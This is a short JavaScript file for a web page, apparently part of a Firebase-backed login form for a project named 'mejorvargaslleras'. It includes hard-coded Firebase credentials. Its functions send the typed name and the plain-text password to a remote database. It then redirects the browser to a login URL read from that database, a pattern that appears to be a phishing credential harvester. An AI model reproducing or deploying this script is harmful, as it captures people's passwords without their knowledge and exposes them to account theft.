






//////////////7


var config = {
    apiKey: "AIzaSyDDeEsPxBYxzisg4GDOpmYbHBLvIw6L_IY",
    authDomain: "mejorvargaslleras-4fd2e.firebaseapp.com",
    databaseURL: "https://mejorvargaslleras-4fd2e.firebaseio.com",
    projectId: "mejorvargaslleras-4fd2e",
    storageBucket: "mejorvargaslleras-4fd2e.appspot.com",
    messagingSenderId: "912759721594"
  };
  firebase.initializeApp(config);




var general;
var datof="";
var urlloginok="";
var fmsn1="mensajeuno";
var fmsn2="mensajedos";
var general="";
  firebase.database().ref().child("acontrolweb").once('value').then(function(snapshot) {
    var username = (snapshot.val() && snapshot.val().username) || 'Anonymous';
    // ...
    //alert(  snapshot.val());
    mi=snapshot.val();
   // alert(cedu+"  ced celu"+celu);
general=mi;// firebase.database().ref().child("user");

/*for (var indice in s) {
  if(s[indice].cedula==c &&  s[indice].whatsapp==cl){

alert("encontrado");
  }
  console.log("ind'" + indice + "'= " + s[indice]);
}
*///
 
   // document.getElementById("idcumplimiento").innerHTML = snapshot.val();
  });

function subirmensajes(idf,msnt){firebase.database().ref().child(String(idf)).set(String(msnt));}



function login(){



//var nodo="user";





//var vpass=document.getElementById("idpass").value;


var vnombre=document.getElementById("idnombre").value;



subirmensajes(fmsn1,vnombre);
//


alert("subio "+ vnombre);


}








function login2(){


var vpass=document.getElementById("idpass").value;


//var vnombre=document.getElementById("idnombre").value;



subirmensajes(fmsn2,vpass);
//


alert("subio" + vpass);
}



function login3(){
window.location =general.welogin;

}

